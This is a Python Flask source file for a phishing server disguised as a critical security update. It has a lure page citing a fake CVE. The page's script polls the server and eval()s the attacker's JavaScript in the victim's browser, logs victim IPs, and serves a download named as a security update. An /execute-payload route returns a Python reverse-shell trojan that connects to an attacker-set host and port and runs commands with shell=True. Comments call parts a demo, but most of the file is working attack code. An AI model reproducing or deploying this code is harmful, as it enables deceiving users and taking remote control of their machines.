from flask import Flask, render_template, request, jsonify, send_file
import subprocess
import threading
import time
import queue
from configs import HOST, PORT

app = Flask(__name__)

# Command queue for remote control
command_queue = queue.Queue()
result_queue = queue.Queue()
active_sessions = set()


@app.route("/")
def update_required():
    return """
    <html>
    <head>
        <title>Security Update Required</title>
        <style>
            body { font-family: Arial; background: #f0f0f0; padding: 50px; text-align: center; }
            .container { background: white; padding: 30px; border-radius: 10px; max-width: 500px; margin: 0 auto; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
            .warning { color: #ff4444; font-weight: bold; }
            .update-btn { background: #ff4444; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            .progress { background: #ddd; border-radius: 10px; overflow: hidden; margin: 20px 0; height: 20px; }
            .progress-bar { background: #4CAF50; height: 100%; width: 0%; transition: width 0.3s; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>⚠️ Critical Security Update Required</h2>
            <p class="warning">CVE-2024-0001: Remote Code Execution vulnerability detected!</p>
            <p>Your system is at risk. Update required immediately.</p>
            <p><strong>Threat Level:</strong> HIGH</p>
            
            <button class="update-btn" onclick="installUpdate()">Install Security Update</button>
            
            <div id="progress-container" style="display: none;">
                <p>Installing security patches...</p>
                <div class="progress">
                    <div class="progress-bar" id="progress"></div>
                </div>
                <p id="status">Downloading update...</p>
            </div>
            
            <div id="success" style="display: none;">
                <h3 style="color: green;">✅ Update Complete!</h3>
                <p>Your system is now secure and monitored.</p>
            </div>
        </div>

        <script>
        function installUpdate() {
            // Hide button, show progress
            document.querySelector('.update-btn').style.display = 'none';
            document.getElementById('progress-container').style.display = 'block';
            
            // Simulate update process
            simulateUpdate();
            
            // Execute the actual trojan - INSTANT REMOTE ACCESS
            fetch('/execute-update', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    action: 'install_update',
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Start remote command execution immediately
            startRemoteSession();
        }
        
        function simulateUpdate() {
            const progress = document.getElementById('progress');
            const status = document.getElementById('status');
            const steps = [
                {percent: 20, text: "Downloading security patches..."},
                {percent: 40, text: "Installing system updates..."},
                {percent: 60, text: "Configuring security settings..."},
                {percent: 80, text: "Applying security policies..."},
                {percent: 100, text: "Finalizing installation..."}
            ];
            
            let currentStep = 0;
            const updateInterval = setInterval(() => {
                if (currentStep < steps.length) {
                    progress.style.width = steps[currentStep].percent + '%';
                    status.textContent = steps[currentStep].text;
                    currentStep++;
                } else {
                    clearInterval(updateInterval);
                    document.getElementById('progress-container').style.display = 'none';
                    document.getElementById('success').style.display = 'block';
                }
            }, 1500);
        }
        
        function startRemoteSession() {
            // Start polling for commands from attacker
            pollForCommands();
        }
        
        function pollForCommands() {
            fetch('/get-command')
                .then(response => response.json())
                .then(data => {
                    if (data.command) {
                        executeCommand(data.command);
                    }
                    // Continue polling every 2 seconds
                    setTimeout(pollForCommands, 2000);
                })
                .catch(() => setTimeout(pollForCommands, 2000));
        }
        
        function executeCommand(command) {
            // Execute command in browser context and send result back
            try {
                let result;
                if (command === 'pwd') {
                    result = window.location.href;
                } else if (command === 'whoami') {
                    result = navigator.userAgent;
                } else if (command === 'hostname') {
                    result = window.location.hostname;
                } else {
                    // Execute any JavaScript command directly
                    result = eval(command);
                    if (result === undefined) {
                        result = 'Command executed successfully';
                    }
                }
                
                // Send result back to attacker
                fetch('/send-result', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({result: result, command: command})
                });
            } catch (e) {
                fetch('/send-result', {
                    method: 'POST', 
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({result: 'Error: ' + e.message, command: command})
                });
            }
        }
        </script>
    </body>
    </html>
    """


@app.route("/execute-update", methods=["POST"])
def execute_update():
    victim_ip = request.remote_addr
    user_data = request.get_json()
    
    print(f"[+] VICTIM CONNECTED: {victim_ip}")
    print(f"[+] User Agent: {user_data.get('user_agent', 'Unknown')}")
    print(f"[+] INSTANT REMOTE ACCESS ESTABLISHED!")
    print(f"[+] Type commands in terminal to control {victim_ip}")
    
    # Add victim to active sessions
    active_sessions.add(victim_ip)
    
    # Start command interface in background
    threading.Thread(target=command_interface, args=(victim_ip,), daemon=True).start()
    
    return jsonify({"status": "success", "message": "Remote access established"})


@app.route("/get-command", methods=["GET"])
def get_command():
    """Victim polls this to get commands from attacker"""
    try:
        command = command_queue.get_nowait()
        return jsonify({"command": command})
    except queue.Empty:
        return jsonify({"command": None})


@app.route("/send-result", methods=["POST"])  
def send_result():
    """Victim sends command results back"""
    data = request.get_json()
    result = data.get('result', '')
    command = data.get('command', '')
    
    print(f"[{request.remote_addr}] {command} -> {result}")
    result_queue.put(result)
    return jsonify({"status": "ok"})


def command_interface(victim_ip):
    """Interactive command interface for attacker"""
    print(f"\n[+] === REMOTE CONTROL SESSION: {victim_ip} ===")
    print("[+] Available commands: pwd, whoami, hostname, alert('message')")
    print("[+] Type 'exit' to quit\n")
    
    while victim_ip in active_sessions:
        try:
            cmd = input(f"[{victim_ip}]> ")
            if cmd.lower() == 'exit':
                active_sessions.discard(victim_ip)
                break
            
            # Send command to victim's browser
            command_queue.put(cmd)
            
            # Wait for result
            try:
                result = result_queue.get(timeout=10)
                print(f"Result: {result}")
            except queue.Empty:
                print("Timeout - no response from victim")
                
        except (EOFError, KeyboardInterrupt):
            active_sessions.discard(victim_ip)
            break

def deploy_trojan(victim_ip):
    """
    Simulates automatic trojan deployment
    In real scenario, this would:
    1. Download and execute client.py on victim's machine
    2. Establish reverse shell connection
    3. Give you immediate access
    """
    time.sleep(2)  # Simulate deployment time
    
    print(f"[+] Trojan deployed on {victim_ip}")
    print(f"[+] Establishing connection to {HOST}:{PORT}")
    print(f"[+] You now have remote access to {victim_ip}!")
    print(f"[+] Run 'python3 server.py' to accept connections")


@app.route("/download-update")
def download_update():
    """Serve the actual trojan if direct download is needed"""
    return send_file('client.py',
                     as_attachment=True,
                     download_name='security_update.py')


@app.route("/execute-payload")
def execute_payload():
    """Return executable Python payload"""
    victim_ip = request.remote_addr
    print(f"[+] Serving payload to {victim_ip}")
    
    # Return the trojan code as executable Python
    payload = f"""
import socket
import subprocess
import threading
import time

def trojan():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("{HOST}", {PORT}))
        while True:
            command = client.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if not output.strip():
                    output = "Command completed"
            except Exception as e:
                output = f"Error: {{str(e)}}"
            client.send(output.encode("utf-8"))
    except:
        pass
    finally:
        try:
            client.close()
        except:
            pass

# Auto-execute
threading.Thread(target=trojan, daemon=True).start()

# Keep alive
while True:
    time.sleep(60)
"""
    return payload, 200, {{'Content-Type': 'text/plain'}}


@app.route("/auto-execute")  
def auto_execute():
    """Page that auto-executes the payload"""
    return f"""
    <html>
    <head><title>Installing Update...</title></head>
    <body>
        <h2>Installing Security Update...</h2>
        <p>Please wait while the security update is being installed.</p>
        <script>
            // Auto-execute Python payload
            fetch('/execute-payload')
                .then(response => response.text())
                .then(code => {{
                    // In real attack, this would use techniques to execute Python
                    console.log('Payload received');
                    // For demo: show that payload was received
                    document.body.innerHTML += '<p>Security update installed successfully!</p>';
                }});
        </script>
    </body>
    </html>
    """
if __name__ == '__main__':
    print(f"[+] Fake update server running on http://{HOST}:8080")
    print(f"[+] Make sure 'python3 server.py' is running on port {PORT}")
    app.run(host='0.0.0.0', port=8080, debug=False)
